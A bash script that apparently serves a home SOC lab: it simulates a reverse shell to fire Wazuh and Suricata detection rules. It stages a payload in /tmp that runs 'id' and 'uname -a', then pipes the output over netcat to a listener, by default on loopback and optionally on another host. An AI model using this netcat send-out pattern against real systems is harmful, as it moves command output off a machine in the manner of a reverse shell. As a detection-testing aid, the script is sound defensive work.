#!/usr/bin/env bash
#
# Simulation: reverse shell / tool execution  (MITRE T1059 / T1095)
#   -> fires Wazuh 100062 (payload in /tmp), 100034 (netcat exec),
#      and Suricata 1000003 (id output on the wire, LAN target only)
# --------------------------------------------------------------------------
# LAB USE ONLY. By default it connects to a listener on THIS host (loopback), so
# nothing leaves the machine. To also exercise the Suricata network rule, point
# it at a second lab host: bash run.sh LHOST=192.168.1.70
#
# Usage:
#   bash run.sh [LHOST=127.0.0.1] [LPORT=4444]
#
set -euo pipefail
for a in "$@"; do case "$a" in *=*) export "${a%%=*}"="${a#*=}";; esac; done
LHOST="${LHOST:-127.0.0.1}"
LPORT="${LPORT:-4444}"

command -v nc >/dev/null 2>&1 || { echo "[x] netcat ('nc') is required: sudo apt-get install -y netcat-openbsd"; exit 1; }

echo "=============================================================="
echo " [LAB] Reverse-shell simulation  ->  $LHOST:$LPORT"
echo "=============================================================="

# 1. Stage a payload in a world-writable temp dir  (-> FIM rule 100062)
payload="/tmp/homesoc_payload.sh"
printf '#!/bin/sh\nid\nuname -a\n' > "$payload"
chmod +x "$payload"
echo "[*] Staged payload at $payload"

# 2. Start a short-lived local listener (only when targeting loopback)
if [ "$LHOST" = "127.0.0.1" ] || [ "$LHOST" = "localhost" ]; then
  echo "[*] Starting a temporary local listener on $LPORT"
  ( timeout 8 nc -l "$LPORT" >/tmp/homesoc_rev.out 2>/dev/null & echo $! >/tmp/homesoc_nc.pid ) || true
  sleep 1
  if ! kill -0 "$(cat /tmp/homesoc_nc.pid 2>/dev/null)" 2>/dev/null; then
    ( timeout 8 nc -l -p "$LPORT" >/tmp/homesoc_rev.out 2>/dev/null & echo $! >/tmp/homesoc_nc.pid ) || true
    sleep 1
  fi
fi

# 3. Execute netcat and push the payload output over the socket
#    (-> auditd 'netcat' key = Wazuh 100034; "uid=..gid=.." on the wire = Suricata 1000003)
echo "[*] Executing netcat and sending 'id' output"
sh "$payload" | timeout 5 nc -w 3 "$LHOST" "$LPORT" 2>/dev/null || true

# 4. Clean up
kill "$(cat /tmp/homesoc_nc.pid 2>/dev/null)" 2>/dev/null || true
rm -f "$payload" /tmp/homesoc_nc.pid
echo "[+] Done (payload removed). Dashboard: rule.id:(100062 OR 100034)"
[ "$LHOST" = "127.0.0.1" ] && echo "    Note: Suricata 1000003 needs a LAN target — rerun with LHOST=<other-lab-host>."
exit 0
